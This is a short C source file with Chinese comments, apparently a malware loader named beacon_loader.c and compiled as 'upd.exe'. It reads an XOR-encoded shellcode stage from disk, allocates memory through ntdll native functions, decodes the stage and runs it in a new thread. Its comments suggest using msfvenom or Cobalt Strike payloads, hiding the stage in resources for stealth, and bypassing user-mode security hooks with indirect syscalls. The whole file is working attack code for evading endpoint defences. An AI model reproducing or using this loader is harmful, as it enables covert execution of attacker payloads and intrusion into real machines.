// 或 MinGW: x86_64-w64-mingw32-gcc -O2 -s -o upd.exe beacon_loader.c -lntdll
#include <windows.h>
#include <stdio.h>

// ---- 1. 从资源/文件中读取 raw stage（此处演示从同目录 file 读，改成资源更隐蔽）----
static BOOL ReadStage(LPCSTR path, PBYTE* out, DWORD* size) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    DWORD sz = GetFileSize(h, NULL);
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sz);
    DWORD r = 0;
    ReadFile(h, buf, sz, &r, NULL);
    CloseHandle(h);
    *out = buf; *size = r;
    return TRUE;
}

// ---- 2. 直接/间接 syscall 桩（x64）----
// 用 ntdll 未导出函数地址做间接调用，绕用户态 hook
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *pNtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);

static PVOID GetSyscallAddr(LPCSTR name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    return (PVOID)GetProcAddress(ntdll, name); // 生产环境改为解析导出表 + 跳过 hook 取 syscall 号
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
    PBYTE stage = NULL; DWORD stageLen = 0;
    // 实际落地: 把 shellcode 用 msfvenom/CS 导出成 stage.bin 放同目录，或写进资源段
    if (!ReadStage("stage.bin", &stage, &stageLen)) return 1;

    // ---- 3. 映射可执行内存 (RW -> 写入 -> RX) ----
    HANDLE hProc = (HANDLE)-1; // 当前进程
    PVOID  base  = NULL;
    SIZE_T sz    = stageLen;

    pNtAllocateVirtualMemory NtAlloc = (pNtAllocateVirtualMemory)GetSyscallAddr("NtAllocateVirtualMemory");
    pNtProtectVirtualMemory  NtProt  = (pNtProtectVirtualMemory)GetSyscallAddr("NtProtectVirtualMemory");
    pNtCreateThreadEx        NtThread= (pNtCreateThreadEx)GetSyscallAddr("NtCreateThreadEx");
    pNtWaitForSingleObject   NtWait  = (pNtWaitForSingleObject)GetSyscallAddr("NtWaitForSingleObject");

    ULONG prot = PAGE_READWRITE;
    NtAlloc(hProc, &base, 0, &sz, MEM_COMMIT | MEM_RESERVE, prot);

    // ---- 4. 解混淆写入（演示 XOR 0x41，按需换 RC4/AES）----
    for (DWORD i = 0; i < stageLen; i++) ((PBYTE)base)[i] = stage[i] ^ 0x41;

    ULONG old = 0;
    NtProt(hProc, &base, &sz, PAGE_EXECUTE_READ, &old);

    // ---- 5. 执行并等待 ----
    HANDLE hThr = NULL;
    NtThread(&hThr, THREAD_ALL_ACCESS, NULL, hProc, base, NULL, 0, 0, 0, 0, NULL);
    if (hThr) NtWait(hThr, FALSE, NULL);

    HeapFree(GetProcessHeap(), 0, stage);
    return 0;
}
